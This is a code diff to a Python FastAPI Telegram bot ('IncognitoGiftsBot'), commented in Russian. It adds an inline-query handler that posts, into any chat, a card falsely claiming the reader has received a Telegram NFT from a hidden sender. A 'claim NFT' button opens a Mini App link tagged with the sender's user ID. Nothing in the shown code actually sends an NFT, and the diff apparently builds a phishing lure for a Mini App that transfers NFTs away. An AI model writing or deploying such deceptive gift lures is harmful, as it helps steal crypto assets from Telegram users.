@@ -2,8 +2,8 @@ from fastapi import FastAPI, HTTPException, Request
 from fastapi.middleware.cors import CORSMiddleware
 from fastapi.responses import HTMLResponse
 from pydantic import BaseModel
-from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
-from telegram.ext import Application, CommandHandler, ContextTypes
+from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, InlineQueryResultArticle, InputTextMessageContent
+from telegram.ext import Application, CommandHandler, ContextTypes, InlineQueryHandler
 import os
 from dotenv import load_dotenv
 import logging
@@ -65,12 +65,47 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await update.message.reply_text(
-        "🦦 Отправь /start чтобы получить ссылку для перевода NFT",
+        "🦦 Напиши `@IncognitoGiftsBot` в любом чате чтобы отправить NFT!",
         parse_mode='Markdown'
     )
 
+async def inline_query(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Обрабатывает inline запросы - показывает красивую карточку с GIF"""
+    user_id = update.inline_query.from_user.id
+
+    # Ссылка на Mini App
+    mini_app_link = f"https://t.me/{BOT_USERNAME}/{APP_SHORT_NAME}?startapp={user_id}"
+
+    # Создаём красивую карточку с кнопкой
+    keyboard = [
+        [InlineKeyboardButton("🎁 Забрать NFT", url=mini_app_link)]
+    ]
+    reply_markup = InlineKeyboardMarkup(keyboard)
+
+    # Результат с текстом и кнопкой
+    results = [
+        InlineQueryResultArticle(
+            id="nft_gift",
+            title="🎁 Отправить Telegram NFT",
+            description="Получатель сможет забрать все NFT одной кнопкой",
+            thumbnail_url="https://nft.fragment.com/telegram.gif",
+            input_message_content=InputTextMessageContent(
+                message_text=(
+                    "🎁 **Вам отправлен Telegram NFT**\n\n"
+                    "От: **Аккаунт скрыт**\n\n"
+                    "Нажмите кнопку ниже чтобы забрать NFT!"
+                ),
+                parse_mode='Markdown'
+            ),
+            reply_markup=reply_markup
+        )
+    ]
+
+    await update.inline_query.answer(results, cache_time=1)
+
 telegram_app.add_handler(CommandHandler("start", start))
 telegram_app.add_handler(CommandHandler("help", help_command))
+telegram_app.add_handler(InlineQueryHandler(inline_query))
 
 user_addresses = {}
 
